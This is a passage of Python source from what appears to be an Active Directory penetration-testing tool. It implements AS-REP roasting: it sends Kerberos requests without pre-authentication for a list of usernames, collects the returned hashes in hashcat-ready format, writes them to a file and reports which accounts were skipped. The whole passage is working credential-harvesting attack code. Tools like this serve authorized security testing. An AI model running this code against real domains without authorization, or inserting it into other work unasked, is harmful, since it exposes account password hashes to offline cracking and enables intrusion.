        output_file: Optional[Path],
    ) -> List[ASREPHash]:
        """Attempt AS-REP roasting directly from a user wordlist."""
        return self._collect_asrep_hashes_for_users(
            domain=domain,
            pdc=pdc,
            usernames=self._read_target_lines(usersfile),
            output_file=output_file,
        )

    def _collect_asrep_hashes_for_users(
        self,
        *,
        domain: str,
        pdc: str,
        usernames: list[str],
        output_file: Optional[Path],
    ) -> List[ASREPHash]:
        """Request AS-REPs for a list of candidate usernames via kerbad.

        kerbad's ``asreproast`` generator sends an AS-REQ without pre-auth for
        each username and returns the hash formatted as hashcat 18200.

        Hashcat format (kerbad TGTTicket2hashcat):
            ``$krb5asrep$<etype>$<user>@<DOMAIN>:<checksum>$<ciphertext>``
        """
        filtered = [
            u
            for u in (str(u or "").strip() for u in usernames)
            if u and not u.endswith("$")
        ]
        if not filtered:
            return []

        try:
            roast_results = run_async_sync(asreproast_users(pdc, domain, filtered))
        except KerberosTransportError as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Kerberos transport error during AS-REP roasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Unexpected error during AS-REP roasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []

        lines_to_write: list[str] = []
        hashes_list: list[ASREPHash] = []
        table_rows: list[tuple[str, str, str, str]] = []
        preauth_count = 0
        revoked_count = 0
        other_skip_count = 0
        for username, hash_line, err in roast_results:
            user_display = mark_sensitive(username, "user")
            if err is not None and not hash_line:
                err_text = str(err)
                low = err_text.lower()
                if "preauth" in low or "kdc_err_preauth_required" in low:
                    preauth_count += 1
                    table_rows.append(
                        (
                            user_display,
                            "[yellow]preauth required[/yellow]",
                            "—",
                            "account enforces preauth",
                        )
                    )
                elif "revoked" in low or "kdc_err_client_revoked" in low:
                    revoked_count += 1
                    table_rows.append(
                        (
                            user_display,
                            "[dim]disabled[/dim]",
                            "—",
                            "account disabled or locked",
                        )
                    )
                else:
                    other_skip_count += 1
                    print_info_verbose(f"[skip] {user_display}: {err_text}")
                    table_rows.append(
                        (user_display, "[yellow]skipped[/yellow]", "—", err_text[:80])
                    )
                continue
            if not hash_line:
                other_skip_count += 1
                table_rows.append(
                    (
                        user_display,
                        "[yellow]no hash[/yellow]",
                        "—",
                        "no AS-REP returned",
                    )
                )
                continue
            hashes_list.append(ASREPHash(username=username, hash_value=hash_line))
            lines_to_write.append(hash_line)
            etype_label = _extract_etype(hash_line)
            styled = _styled_etype(etype_label)
            print_success(f"  └─ {user_display}  ({styled})  →  hashcat-ready")
            table_rows.append(
                (user_display, "[green]hash[/green]", etype_label, "AS-REP retrieved")
            )

        self._write_hash_lines(output_file, lines_to_write)

        skipped_total = preauth_count + revoked_count + other_skip_count
        if skipped_total and not is_verbose_mode():
            parts: list[str] = []
            if preauth_count:
                parts.append(f"{preauth_count} preauth-enforced")
            if revoked_count:
                parts.append(f"{revoked_count} disabled/revoked")
            if other_skip_count:
                parts.append(f"{other_skip_count} other")
            print_info(
                f"  [dim]{skipped_total} users skipped: "
                f"{' · '.join(parts)}  (run with --verbose for full table)[/dim]"
            )
        elif is_verbose_mode():
            _render_roast_summary(title="AS-REP Roast Results", rows=table_rows)

        _render_etype_advisory(
            [k for h in lines_to_write if (k := _extract_etype_key(h))],
            roast_type="asreproast",
        )
        return hashes_list
